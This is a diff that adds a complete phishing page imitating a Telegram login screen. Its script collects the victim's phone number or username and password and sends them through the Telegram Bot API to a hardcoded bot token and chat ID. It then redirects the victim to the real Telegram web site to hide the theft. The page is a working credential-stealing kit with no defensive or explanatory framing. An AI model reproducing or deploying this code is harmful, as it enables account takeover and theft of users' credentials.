@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Telegram Login</title>
+  <style>
+    body {
+      background-color: #0088cc;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .login-box {
+      background: white;
+      border-radius: 15px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      padding: 40px;
+      width: 320px;
+      text-align: center;
+    }
+
+    .login-box h2 {
+      color: #0088cc;
+      margin-bottom: 20px;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 12px;
+      background: #0088cc;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .login-box button:hover {
+      background: #007ab8;
+    }
+  </style>
+</head>
+<body>
+
+<div class="login-box">
+  <h2>Telegram Login</h2>
+  <form onsubmit="sendToTelegram(); return false;">
+    <input type="text" id="username" placeholder="Phone number or Username" required>
+    <input type="password" id="password" placeholder="Password" required>
+    <button type="submit">Next</button>
+  </form>
+</div>
+
+<script>
+  function sendToTelegram() {
+    var username = document.getElementById("username").value;
+    var password = document.getElementById("password").value;
+    var message = "Telegram Login:\nUsername: " + username + "\nPassword: " + password;
+
+    fetch("https://api.telegram.org/bot8074635756:AAEv1JfCJm5Nmf3X3isqnrCdM3q6bpwNtrs/sendMessage", {
+      method: "POST",
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: "6995579781",
+        text: message
+      })
+    }).then(response => {
+      if (response.ok) {
+        alert("Logging in...");
+        window.location.href = "https://web.telegram.org/";
+      } else {
+        alert("Failed to send login.");
+      }
+    });
+  }
+</script>
+
+</body>
+</html
